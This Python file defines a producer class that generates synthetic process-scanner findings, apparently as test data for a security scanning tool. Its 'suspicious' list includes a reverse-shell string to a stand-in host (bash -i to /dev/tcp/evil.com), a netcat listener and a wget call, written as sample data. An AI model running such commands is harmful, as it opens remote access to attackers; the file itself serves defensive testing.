"""
Process scanner producer for generating synthetic process-related findings.
"""

from typing import Dict, List, Any
import random
import uuid
from base_producer import BaseProducer

class ProcessProducer(BaseProducer):
    """Producer for synthetic process scanner findings."""

    def __init__(self):
        super().__init__("processes")
        self.common_processes = [
            "/usr/sbin/sshd", "/usr/bin/bash", "/usr/bin/python3", "/usr/sbin/apache2",
            "/usr/bin/dockerd", "/usr/sbin/mysqld", "/usr/bin/node", "/usr/bin/java",
            "/usr/bin/systemd", "/usr/sbin/cron", "/usr/bin/gnome-shell", "/usr/bin/firefox"
        ]
        self.suspicious_patterns = [
            "/tmp/malicious", "/var/tmp/backdoor", "/home/user/.hidden/malware",
            "/usr/local/bin/suspicious", "/opt/evil/process"
        ]

    def generate_findings(self, count: int = 10) -> List[Dict[str, Any]]:
        """Generate synthetic process findings."""
        findings = []

        for i in range(count):
            scenario = self._choose_scenario()
            finding = self._generate_process_finding(scenario, i)
            findings.append(finding)

        return findings

    def _generate_process_finding(self, scenario: str, index: int) -> Dict[str, Any]:
        """Generate a single process finding based on scenario."""

        if scenario == 'normal':
            return self._generate_normal_process(index)
        elif scenario == 'suspicious':
            return self._generate_suspicious_process(index)
        elif scenario == 'malicious':
            return self._generate_malicious_process(index)
        elif scenario == 'edge_case':
            return self._generate_edge_case_process(index)
        else:
            return self._generate_normal_process(index)

    def _generate_normal_process(self, index: int) -> Dict[str, Any]:
        """Generate a normal process finding."""
        process = random.choice(self.common_processes)
        pid = random.randint(1000, 9999)

        return self._generate_base_finding(
            finding_id=f"proc_{pid}_{index}",
            title=f"Running process: {process.split('/')[-1]}",
            severity="info",
            risk_score=10,
            base_severity_score=10,
            description=f"Normal system process {process} is running with PID {pid}",
            metadata={
                "pid": pid,
                "command": process,
                "user": "root" if random.random() < 0.3 else "user",
                "state": "S (sleeping)",
                "ppid": random.randint(1, 1000)
            }
        )

    def _generate_suspicious_process(self, index: int) -> Dict[str, Any]:
        """Generate a suspicious process finding."""
        suspicious_commands = [
            "/usr/bin/nc -l 4444", "/usr/bin/python3 -c 'import socket'",
            "/bin/bash -i >& /dev/tcp/evil.com/8080", "/usr/bin/wget http://suspicious.com"
        ]
        command = random.choice(suspicious_commands)
        pid = random.randint(10000, 20000)

        return self._generate_base_finding(
            finding_id=f"proc_susp_{pid}_{index}",
            title="Suspicious process detected",
            severity="medium",
            risk_score=50,
            base_severity_score=50,
            description=f"Process with suspicious command pattern: {command}",
            metadata={
                "pid": pid,
                "command": command,
                "user": "www-data" if random.random() < 0.5 else "user",
                "state": "R (running)",
                "ppid": random.randint(1, 1000),
                "pattern_match": True
            }
        )

    def _generate_malicious_process(self, index: int) -> Dict[str, Any]:
        """Generate a malicious process finding."""
        malicious_commands = [
            "/tmp/.evil/malware --daemon", "/var/tmp/backdoor -p 1337",
            "/home/user/.config/.malware", "/usr/local/bin/rootkit"
        ]
        command = random.choice(malicious_commands)
        pid = random.randint(20000, 30000)

        return self._generate_base_finding(
            finding_id=f"proc_mal_{pid}_{index}",
            title="Malicious process detected",
            severity="high",
            risk_score=80,
            base_severity_score=80,
            description=f"Process exhibiting malicious behavior: {command}",
            metadata={
                "pid": pid,
                "command": command,
                "user": "root",
                "state": "R (running)",
                "ppid": 1,
                "deleted_executable": True,
                "world_writable_executable": True
            }
        )

    def _generate_edge_case_process(self, index: int) -> Dict[str, Any]:
        """Generate an edge case process finding."""
        edge_cases = [
            {"cmd": "/proc/self/exe", "desc": "Process executing from /proc/self/exe"},
            {"cmd": "", "desc": "Process with empty command line"},
            {"cmd": "A" * 1000, "desc": "Process with extremely long command line"},
            {"cmd": "/dev/null", "desc": "Process executing /dev/null"}
        ]
        edge_case = random.choice(edge_cases)

        return self._generate_base_finding(
            finding_id=f"proc_edge_{index}",
            title="Edge case process",
            severity="low",
            risk_score=30,
            base_severity_score=30,
            description=edge_case["desc"],
            metadata={
                "pid": random.randint(1, 100),
                "command": edge_case["cmd"],
                "user": "kernel",
                "state": "Z (zombie)" if random.random() < 0.5 else "S (sleeping)",
                "ppid": 0
            }
        )